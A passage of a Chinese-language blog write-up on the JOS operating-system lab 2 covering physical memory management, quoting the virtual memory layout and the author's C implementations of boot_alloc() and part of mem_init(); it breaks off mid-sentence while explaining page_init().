src="https://s2.loli.net/2022/02/21/3JksWlBiI7VNYEG.png" alt="imagepng"></p><p>运行 <code>make grade</code> 以检查 lab 1 的完成情况，可以看到我们成功完成了 lab 1 的代码部分，至此， lab 1 结束</p><p><img src="https://s2.loli.net/2022/02/21/GM57bwBngJP6UdO.png" alt="imagepng"></p><h1 id="0x02-Lab-2-Memory-Management"><a href="#0x02-Lab-2-Memory-Management" class="headerlink" title="0x02.Lab 2: Memory Management"></a>0x02.Lab 2: Memory Management</h1><p>在这一部分当中我们需要实现 OS kernel 的<strong>内存管理模块</strong>，分为两部分：</p><ul><li><p>物理内存分配器：我们需要将所有的物理内存以「页」为单位进行管理，并记录下各个页的状态（空闲或已被分配）、共享该页面的进程数量等，并实现分配与释放物理页的函数</p></li><li><p>虚拟内存分配器：我们需要完成对页表的管理，主要是实现虚拟地址到物理地址的映射的建立功能</p></li></ul><p>首先用 git 拉 lab2 的代码下来，这里笔者前面 lab 1 的代码没有 handin 所以前面提示了一下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">git checkout -b lab2 origin/lab2</span><br>M    kern/kdebug.c<br>M    kern/monitor.c<br>M    lib/printfmt.c<br>Branch &#x27;lab2&#x27; set up to track remote branch &#x27;lab2&#x27; from &#x27;origin&#x27;.<br>Switched to a new branch &#x27;lab2&#x27;<br></code></pre></td></tr></table></figure><p>lab 2 新增了这些文件：</p><ul><li>inc&#x2F;memlayout.h</li><li>kern&#x2F;pmap.c</li><li>kern&#x2F;pmap.h</li><li>kern&#x2F;kclock.h</li><li>kern&#x2F;kclock.c</li></ul><p><code>memlayout.h</code> 中描述了虚拟地址空间的布局，我们需要通过修改 <code>pmap.c</code> 来实现；在 <code>memlayout.h</code> 与 <code>pmap.h</code> 中定义了 <code>Pageinfo</code> 结构体，用以描述单个物理页，与 Linux 内核的做法类似，一个 Pageinfo 对应一张物理页，所以在该结构体中只需要存储该页的状态即可；<code>kclock.c</code> 与 <code>kclock.h</code> 用以操作电池后备时钟与 CMOS RAM 硬件，其在 BIOS 中记录了 PC 的物理内存容量与其他东西，在 <code>pmap.c</code> 中的代码需要读取该设备以计算可用物理内存，这部分代码 xv6 已经帮我们实现好了所以我们暂时不需要了解 CMOS 的原理</p><blockquote><p> 在笔者的 <a href="https://arttnba3.cn/2021/06/24/CODE-0X00-A3OS/">【CODE.0x00】从零开始的32位操作系统开发手记 - arttnba3’s blog</a> 中记录了三种获取可用物理内存容量与布局的方式，原型来自 Linux 内核</p></blockquote><p>在 <code>memlayout.h</code> 中对将要建立的内存布局描述如下：</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">/<span class="hljs-symbol">*</span><br> <span class="hljs-symbol">*</span> Virtual memory map:                                Permissions<br> <span class="hljs-symbol">*</span>                                                    kernel/user<br> <span class="hljs-symbol">*</span><br> <span class="hljs-symbol">*</span>    4 Gig --------&gt;  +------------------------------+<br> <span class="hljs-symbol">*</span>                     |<span class="hljs-string">                              </span>|<span class="hljs-string"> RW/--</span><br><span class="hljs-string"> *                     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span><br><span class="hljs-string"> *                     :              .               :</span><br><span class="hljs-string"> *                     :              .               :</span><br><span class="hljs-string"> *                     :              .               :</span><br><span class="hljs-string"> *                     </span>|<span class="hljs-string">~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span>|<span class="hljs-string"> RW/--</span><br><span class="hljs-string"> *                     </span>|<span class="hljs-string">                              </span>|<span class="hljs-string"> RW/--</span><br><span class="hljs-string"> *                     </span>|<span class="hljs-string">   Remapped Physical Memory   </span>|<span class="hljs-string"> RW/--</span><br><span class="hljs-string"> *                     </span>|<span class="hljs-string">                              </span>|<span class="hljs-string"> RW/--</span><br><span class="hljs-string"> *    KERNBASE, ----&gt;  +------------------------------+ 0xf0000000      --+</span><br><span class="hljs-string"> *    KSTACKTOP        </span>|<span class="hljs-string">     CPU0&#x27;s Kernel Stack      </span>|<span class="hljs-string"> RW/--  KSTKSIZE   </span>|<br> <span class="hljs-symbol">*</span>                     |<span class="hljs-string"> - - - - - - - - - - - - - - -</span>|<span class="hljs-string">                   </span>|<br> <span class="hljs-symbol">*</span>                     |<span class="hljs-string">      Invalid Memory (*)      </span>|<span class="hljs-string"> --/--  KSTKGAP    </span>|<br> <span class="hljs-symbol">*</span>                     +------------------------------+                   |<span class="hljs-string"></span><br><span class="hljs-string"> *                     </span>|<span class="hljs-string">     CPU1&#x27;s Kernel Stack      </span>|<span class="hljs-string"> RW/--  KSTKSIZE   </span>|<br> <span class="hljs-symbol">*</span>                     |<span class="hljs-string"> - - - - - - - - - - - - - - -</span>|<span class="hljs-string">                 PTSIZE</span><br><span class="hljs-string"> *                     </span>|<span class="hljs-string">      Invalid Memory (*)      </span>|<span class="hljs-string"> --/--  KSTKGAP    </span>|<br> <span class="hljs-symbol">*</span>                     +------------------------------+                   |<span class="hljs-string"></span><br><span class="hljs-string"> *                     :              .               :                   </span>|<br> <span class="hljs-symbol">*</span>                     :              .               :                   |<span class="hljs-string"></span><br><span class="hljs-string"> *    MMIOLIM ------&gt;  +------------------------------+ 0xefc00000      --+</span><br><span class="hljs-string"> *                     </span>|<span class="hljs-string">       Memory-mapped I/O      </span>|<span class="hljs-string"> RW/--  PTSIZE</span><br><span class="hljs-string"> * ULIM, MMIOBASE --&gt;  +------------------------------+ 0xef800000</span><br><span class="hljs-string"> *                     </span>|<span class="hljs-string">  Cur. Page Table (User R-)   </span>|<span class="hljs-string"> R-/R-  PTSIZE</span><br><span class="hljs-string"> *    UVPT      ----&gt;  +------------------------------+ 0xef400000</span><br><span class="hljs-string"> *                     </span>|<span class="hljs-string">          RO PAGES            </span>|<span class="hljs-string"> R-/R-  PTSIZE</span><br><span class="hljs-string"> *    UPAGES    ----&gt;  +------------------------------+ 0xef000000</span><br><span class="hljs-string"> *                     </span>|<span class="hljs-string">           RO ENVS            </span>|<span class="hljs-string"> R-/R-  PTSIZE</span><br><span class="hljs-string"> * UTOP,UENVS ------&gt;  +------------------------------+ 0xeec00000</span><br><span class="hljs-string"> * UXSTACKTOP -/       </span>|<span class="hljs-string">     User Exception Stack     </span>|<span class="hljs-string"> RW/RW  PGSIZE</span><br><span class="hljs-string"> *                     +------------------------------+ 0xeebff000</span><br><span class="hljs-string"> *                     </span>|<span class="hljs-string">       Empty Memory (*)       </span>|<span class="hljs-string"> --/--  PGSIZE</span><br><span class="hljs-string"> *    USTACKTOP  ---&gt;  +------------------------------+ 0xeebfe000</span><br><span class="hljs-string"> *                     </span>|<span class="hljs-string">      Normal User Stack       </span>|<span class="hljs-string"> RW/RW  PGSIZE</span><br><span class="hljs-string"> *                     +------------------------------+ 0xeebfd000</span><br><span class="hljs-string"> *                     </span>|<span class="hljs-string">                              </span>|<br> <span class="hljs-symbol">*</span>                     |<span class="hljs-string">                              </span>|<br> <span class="hljs-symbol">*</span>                     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~<br> <span class="hljs-symbol">*</span>                     .                              .<br> <span class="hljs-symbol">*</span>                     .                              .<br> <span class="hljs-symbol">*</span>                     .                              .<br> <span class="hljs-symbol">*</span>                     |<span class="hljs-string">~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span>|<br> <span class="hljs-symbol">*</span>                     |<span class="hljs-string">     Program Data &amp; Heap      </span>|<br> <span class="hljs-symbol">*</span>    UTEXT --------&gt;  +------------------------------+ 0x00800000<br> <span class="hljs-symbol">*</span>    PFTEMP -------&gt;  |<span class="hljs-string">       Empty Memory (*)       </span>|<span class="hljs-string">        PTSIZE</span><br><span class="hljs-string"> *                     </span>|<span class="hljs-string">                              </span>|<br> <span class="hljs-symbol">*</span>    UTEMP --------&gt;  +------------------------------+ 0x00400000      --+<br> <span class="hljs-symbol">*</span>                     |<span class="hljs-string">       Empty Memory (*)       </span>|<span class="hljs-string">                   </span>|<br> <span class="hljs-symbol">*</span>                     |<span class="hljs-string"> - - - - - - - - - - - - - - -</span>|<span class="hljs-string">                   </span>|<br> <span class="hljs-symbol">*</span>                     |<span class="hljs-string">  User STAB Data (optional)   </span>|<span class="hljs-string">                 PTSIZE</span><br><span class="hljs-string"> *    USTABDATA ----&gt;  +------------------------------+ 0x00200000        </span>|<br> <span class="hljs-symbol">*</span>                     |<span class="hljs-string">       Empty Memory (*)       </span>|<span class="hljs-string">                   </span>|<br> <span class="hljs-symbol">*</span>    0 ------------&gt;  +------------------------------+                 --+<br> <span class="hljs-symbol">*</span><br> <span class="hljs-symbol">*</span> (<span class="hljs-symbol">*</span>) Note: The kernel ensures that <span class="hljs-string">&quot;Invalid Memory&quot;</span> is <span class="hljs-symbol">*</span>never<span class="hljs-symbol">*</span> mapped.<br> <span class="hljs-symbol">*</span>     <span class="hljs-string">&quot;Empty Memory&quot;</span> is normally unmapped, but user programs may map pages<br> <span class="hljs-symbol">*</span>     there if desired.  JOS user programs map pages temporarily at UTEMP.<br> <span class="hljs-symbol">*</span>/<br></code></pre></td></tr></table></figure><h2 id="Part-1-Physical-Page-Management"><a href="#Part-1-Physical-Page-Management" class="headerlink" title="Part 1: Physical Page Management"></a>Part 1: Physical Page Management</h2><p>操作系统应当要管理好内存中的每一张内存页，JOS 同样以页为粒度进行管理，在本部分中我们需要为 JOS 编写一个物理内存页分配器，其使用一个链表来将空闲的物理页对应的 Pageinfo 结构体相连</p><p>在 Exercise 1 中要求我们实现该物理内存页分配器的几个函数</p><blockquote><p>Exercise 1. In the file kern&#x2F;pmap.c, you must implement code for the following functions (probably in the order given).</p><p><code>boot_alloc()</code><br><code>mem_init()</code> (only up to the call to <code>check_page_free_list(1)</code>)<br><code>page_init()</code><br><code>page_alloc()</code><br><code>page_free()</code></p><p><code>check_page_free_list()</code> and <code>check_page_alloc()</code> test your physical page allocator. You should boot JOS and see whether <code>check_page_alloc()</code> reports success. Fix your code so that it passes. You may find it helpful to add your own <code>assert()</code>s to verify that your assumptions are correct.</p></blockquote><p>笔者本人很想直接写一个 buddy system（笑），但一是技术力好像不大够的样子，二是在对 JOS 没有足够了解的情况下还是先按照给的注释来实现</p><p>我们先来看 <code>kern/pmap.c</code> ，在一开头声明了这几个全局变量：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// These variables are set by i386_detect_memory()</span><br><span class="hljs-type">size_t</span> npages;<span class="hljs-comment">// Amount of physical memory (in pages)</span><br><span class="hljs-type">static</span> <span class="hljs-type">size_t</span> npages_basemem;<span class="hljs-comment">// Amount of base memory (in pages)</span><br><br><span class="hljs-comment">// These variables are set in mem_init()</span><br><span class="hljs-type">pde_t</span> *kern_pgdir;<span class="hljs-comment">// Kernel&#x27;s initial page directory</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">PageInfo</span> *<span class="hljs-title">pages</span>;</span><span class="hljs-comment">// Physical page state array</span><br><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">PageInfo</span> *<span class="hljs-title">page_free_list</span>;</span><span class="hljs-comment">// Free list of physical pages</span><br></code></pre></td></tr></table></figure><ul><li><code>npages</code>：以页为单位的物理内存总量</li><li><code>npages_basemem</code>：以页为单位的可用内存总量</li><li><code>kern_pgdir</code>：内核的页全局目录表</li><li><code>pages</code>：页结构体（PageInfo）数组的指针</li><li><code>page_free_list</code>：空闲的物理页单向链表头节点</li></ul><p>那么我们这里可以看出来这个内存管理有点类似于 FLATMEM 内存模型：直接由一个大的 page 结构体数组对应一块可用物理内存区域。再加上 “只有一个单向链表的 buddy system”，大概就如下图所示（笔者拿两张讲 Linux的图拆开拼成的）</p><p><img src="https://s2.loli.net/2022/03/15/umCBxeDPFc7I23h.png" alt="JOS的内存管理"></p><p>这里我们需要注意一点：<strong>PageInfo 结构体并不需要存储地址信息，因为他是一个结构体数组直接对应整个物理内存空间</strong>，相应地就有 pages[0] 对应地址 0，pages[1] 对应地址 0x1000…<strong>我们其实很容易能得到 PageInfo 地址到物理页帧之间的转换公式</strong>，这里我们直接看在 <code>kern/pmap.h</code> 中实现的两个转换函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">physaddr_t</span><br><span class="hljs-title function_">page2pa</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> PageInfo *pp)</span><br>&#123;<br><span class="hljs-keyword">return</span> (pp - pages) &lt;&lt; PGSHIFT;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-keyword">struct</span> PageInfo*<br><span class="hljs-title function_">pa2page</span><span class="hljs-params">(<span class="hljs-type">physaddr_t</span> pa)</span><br>&#123;<br><span class="hljs-keyword">if</span> (PGNUM(pa) &gt;= npages)<br>panic(<span class="hljs-string">&quot;pa2page called with invalid pa&quot;</span>);<br><span class="hljs-keyword">return</span> &amp;pages[PGNUM(pa)];<br>&#125;<br></code></pre></td></tr></table></figure><p>当然，我们现在所说的都是虚拟地址，我们仍需要一个虚拟地址与物理地址之间直接转换的函数，参照上图，由于是线性映射，故直接减去一个差值即可，在<code>kern/pmap.h</code> 中便实现了虚拟地址到物理地址转换的函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* This macro takes a kernel virtual address -- an address that points above</span><br><span class="hljs-comment"> * KERNBASE, where the machine&#x27;s maximum 256MB of physical memory is mapped --</span><br><span class="hljs-comment"> * and returns the corresponding physical address.  It panics if you pass it a</span><br><span class="hljs-comment"> * non-kernel virtual address.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PADDR(kva) _paddr(__FILE__, __LINE__, kva)</span><br><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">physaddr_t</span><br>_paddr(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *file, <span class="hljs-type">int</span> line, <span class="hljs-type">void</span> *kva)<br>&#123;<br><span class="hljs-keyword">if</span> ((<span class="hljs-type">uint32_t</span>)kva &lt; KERNBASE)<br>_panic(file, line, <span class="hljs-string">&quot;PADDR called with invalid kva %08lx&quot;</span>, kva);<br><span class="hljs-keyword">return</span> (<span class="hljs-type">physaddr_t</span>)kva - KERNBASE;<br>&#125;<br></code></pre></td></tr></table></figure><p>现在我们可以开始补完 Exercise 1 的几个函数的代码了</p><h4 id="boot-alloc-：物理内存线性分配器"><a href="#boot-alloc-：物理内存线性分配器" class="headerlink" title="boot_alloc()：物理内存线性分配器"></a>boot_alloc()：物理内存线性分配器</h4><p>按惯例，先看注释：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// This simple physical memory allocator is used only while JOS is setting</span><br><span class="hljs-comment">// up its virtual memory system.  page_alloc() is the real allocator.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// If n&gt;0, allocates enough pages of contiguous physical memory to hold &#x27;n&#x27;</span><br><span class="hljs-comment">// bytes.  Doesn&#x27;t initialize the memory.  Returns a kernel virtual address.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// If n==0, returns the address of the next free page without allocating</span><br><span class="hljs-comment">// anything.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// If we&#x27;re out of memory, boot_alloc should panic.</span><br><span class="hljs-comment">// This function may ONLY be used during initialization,</span><br><span class="hljs-comment">// before the page_free_list list has been set up.</span><br></code></pre></td></tr></table></figure><ul><li><p>该函数为一个简易的 physical memory allocator，<strong>只在 JOS 建立其虚拟内存系统时使用</strong>，算是内核初始化过程中的一个临时函数</p></li><li><p>其功能主要是返回以页为单位的连续的物理内存空间的虚拟地址的起始地址，n为0时返回下一个空闲页面，OOM时 panic</p></li></ul><p>掌握了这些信息就可以开始写了，函数一开头定义了一个 static 的变量 <code>nextfree</code>，表示其分配方式是从内存一开始线性往后切割的，由于这是一个虚拟地址所以我们在计算是否 OOM 时还需要转化成物理地址，因为预设页表只映射了 4MB 内存故这里超出 4MB 我们直接 OOM panic；对页大小的对齐直接使用 <code>ROUNDUP</code> 即可</p><blockquote><p>ROUNDUP 是 GCC 的宏还是 JOS 的宏呢？暂且不考证（其实是没找到），这里直接“拿来主义”</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> *<br><span class="hljs-title function_">boot_alloc</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> n)</span><br>&#123;<br><span class="hljs-type">static</span> <span class="hljs-type">char</span> *nextfree;<span class="hljs-comment">// virtual address of next byte of free memory</span><br><span class="hljs-type">char</span> *result;<br><br><span class="hljs-comment">// Initialize nextfree if this is the first time.</span><br><span class="hljs-comment">// &#x27;end&#x27; is a magic symbol automatically generated by the linker,</span><br><span class="hljs-comment">// which points to the end of the kernel&#x27;s bss segment:</span><br><span class="hljs-comment">// the first virtual address that the linker did *not* assign</span><br><span class="hljs-comment">// to any kernel code or global variables.</span><br><span class="hljs-keyword">if</span> (!nextfree) &#123;<br><span class="hljs-keyword">extern</span> <span class="hljs-type">char</span> end[];<br>nextfree = ROUNDUP((<span class="hljs-type">char</span> *) end, PGSIZE);<br>&#125;<br><br><span class="hljs-comment">// Allocate a chunk large enough to hold &#x27;n&#x27; bytes, then update</span><br><span class="hljs-comment">// nextfree.  Make sure nextfree is kept aligned</span><br><span class="hljs-comment">// to a multiple of PGSIZE.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// LAB 2: Your code here.</span><br><br><span class="hljs-comment">// n == 0, return nextfree directly</span><br><span class="hljs-keyword">if</span> (!n)<br><span class="hljs-keyword">return</span> nextfree;<br><br><span class="hljs-comment">// fix up n to PGSIZE</span><br>n = ROUNDUP(n, PGSIZE);<br><br><span class="hljs-comment">// check if OOM, panic</span><br><span class="hljs-keyword">if</span> (PADDR(nextfree + n) &gt; <span class="hljs-number">0x00400000</span>)<br>panic(<span class="hljs-string">&quot;Out of Memory!&quot;</span>);<br><br><span class="hljs-comment">// normally return memory</span><br>result = nextfree;<br>nextfree += n;<br><br><span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="mem-init-：初始化二级页表，建立-freelist（part1）"><a href="#mem-init-：初始化二级页表，建立-freelist（part1）" class="headerlink" title="mem_init()：初始化二级页表，建立 freelist（part1）"></a>mem_init()：初始化二级页表，建立 freelist（part1）</h4><p>按顺序接下来到 <code>mem_init()</code> 函数，惯例先看注释，主要是初始化内核地址空间：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// Set up a two-level page table:</span><br><span class="hljs-comment">//    kern_pgdir is its linear (virtual) address of the root</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// This function only sets up the kernel part of the address space</span><br><span class="hljs-comment">// (ie. addresses &gt;= UTOP).  The user part of the address space</span><br><span class="hljs-comment">// will be set up later.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// From UTOP to ULIM, the user is allowed to read but not write.</span><br><span class="hljs-comment">// Above ULIM the user cannot read or write.</span><br></code></pre></td></tr></table></figure><p>首先是通过 <code>i386_detect_memory()</code> 检测可用内存容量，之后用 <code>boot_alloc()</code> 分配一张页面做二级页表的 PGD，并<strong>建立自我映射，设置对应权限</strong>，以此我们便能通过虚拟地址访问页表了</p><blockquote><p>参见  <code>memlayout.h</code> 中的内存布局，<code>UVPT</code> 指向 PGD 起始地址，<code>PDX()</code> 则是将虚拟地址转换到页目录表项下标的宏，<code>PTE_U</code> 表示 ring0~ring3都能访问，<code>PTE_P</code> 表示该页面存在</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span><br><span class="hljs-title function_">mem_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br><span class="hljs-type">uint32_t</span> cr0;<br><span class="hljs-type">size_t</span> n;<br><br><span class="hljs-comment">// Find out how much memory the machine has (npages &amp; npages_basemem).</span><br>i386_detect_memory();<br><br><span class="hljs-comment">// Remove this line when you&#x27;re ready to test this function.</span><br><span class="hljs-comment">//panic(&quot;mem_init: This function is not finished\n&quot;);</span><br><br><span class="hljs-comment">//////////////////////////////////////////////////////////////////////</span><br><span class="hljs-comment">// create initial page directory.</span><br>kern_pgdir = (<span class="hljs-type">pde_t</span> *) boot_alloc(PGSIZE);<br><span class="hljs-built_in">memset</span>(kern_pgdir, <span class="hljs-number">0</span>, PGSIZE);<br><br><span class="hljs-comment">//////////////////////////////////////////////////////////////////////</span><br><span class="hljs-comment">// Recursively insert PD in itself as a page table, to form</span><br><span class="hljs-comment">// a virtual page table at virtual address UVPT.</span><br><span class="hljs-comment">// (For now, you don&#x27;t have understand the greater purpose of the</span><br><span class="hljs-comment">// following line.)</span><br><br><span class="hljs-comment">// Permissions: kernel R, user R</span><br>kern_pgdir[PDX(UVPT)] = PADDR(kern_pgdir) | PTE_U | PTE_P;<br></code></pre></td></tr></table></figure><p>接下来到由我们补全的部分：分配 pages 数组并初始化为 0，十几秒就能写完：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//////////////////////////////////////////////////////////////////////</span><br><span class="hljs-comment">// Allocate an array of npages &#x27;struct PageInfo&#x27;s and store it in &#x27;pages&#x27;.</span><br><span class="hljs-comment">// The kernel uses this array to keep track of physical pages: for</span><br><span class="hljs-comment">// each physical page, there is a corresponding struct PageInfo in this</span><br><span class="hljs-comment">// array.  &#x27;npages&#x27; is the number of physical pages in memory.  Use memset</span><br><span class="hljs-comment">// to initialize all fields of each struct PageInfo to 0.</span><br><span class="hljs-comment">// Your code goes here:</span><br>pages = (<span class="hljs-keyword">struct</span> PageInfo*) boot_alloc(npages * <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> PageInfo));<br><span class="hljs-built_in">memset</span>(pages, <span class="hljs-number">0</span>, npages * <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> PageInfo));<br></code></pre></td></tr></table></figure><p>继续阅读，接下来会调用 <code>page_init()</code> 初始化 pages 数组中的每一个 PageInfo ，主要是设置引用计数为 0 并链到 freelist 上，之后是三个检查函数，Exercise 1 中提到我们这一步只需要补全到 <code>check_page_free_list()</code>，所以接下来开始补全 <code>page_init()</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//////////////////////////////////////////////////////////////////////</span><br><span class="hljs-comment">// Now that we&#x27;ve allocated the initial kernel data structures, we set</span><br><span class="hljs-comment">// up the list of free physical pages. Once we&#x27;ve done so, all further</span><br><span class="hljs-comment">// memory management will go through the page_* functions. In</span><br><span class="hljs-comment">// particular, we can now map memory using boot_map_region</span><br><span class="hljs-comment">// or page_insert</span><br>page_init();<br><br>check_page_free_list(<span class="hljs-number">1</span>);<br>check_page_alloc();<br>check_page();<br></code></pre></td></tr></table></figure><h4 id="page-init-：初始化-pages-数组与-freelist"><a href="#page-init-：初始化-pages-数组与-freelist" class="headerlink" title="page_init()：初始化 pages 数组与 freelist"></a>page_init()：初始化 pages 数组与 freelist</h4><p>惯例先看注释：初始化 pages 结构体与 freelist</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//</span><br><span class="hljs-comment">// Initialize page structure and memory free list.</span><br><span class="hljs-comment">// After this is done, NEVER use boot_alloc again.  ONLY use the page</span><br><span class="hljs-comment">// allocator functions below to allocate and deallocate physical</span><br><span class="hljs-comment">// memory via the page_free_list.</span><br><span class="hljs-comment">//</span><br></code></pre></td></tr></table></figure><p>接下来按注释进行补全，我们需要明确哪些页在&#x2F;不在空闲状态：</p><ul><li>第一张物理内存页为在使用状态，保存着实模式的 IDT 与 BIOS 结构</li><li><code>[PGSIZE, npages_basemem * PGSIZE)</code> 为可用的空闲内存</li><li><code>[IOPHYSMEM, EXTPHYSMEM)</code> 这一块内存用作 IO，对我们来说是一个“内存空洞”，也不应当被使用</li><li><code>[EXTPHYSMEM, ...)</code> 这一块扩展内存，有的是在使用着的，有的又是空闲的，我们需要绕开：<ul><li>内核镜像</li><li>页表</li><li>其他数据结构</li></ul></li></ul><p>最后一个似乎比较棘手，但我们知道 boot_alloc() 初始化 nextfree 时用到一个变量 end 指向内核 bss 段末尾，说明<strong>往后的都是可用的内存</strong>，因此我们只需要将第三项往后一直到 nextfree 的内存页设为使用状态、nextfree 往后的内存设为空闲页链入 freelist 即可</p><p>这里我们需要注意一个点：<code>boot_alloc()</code> 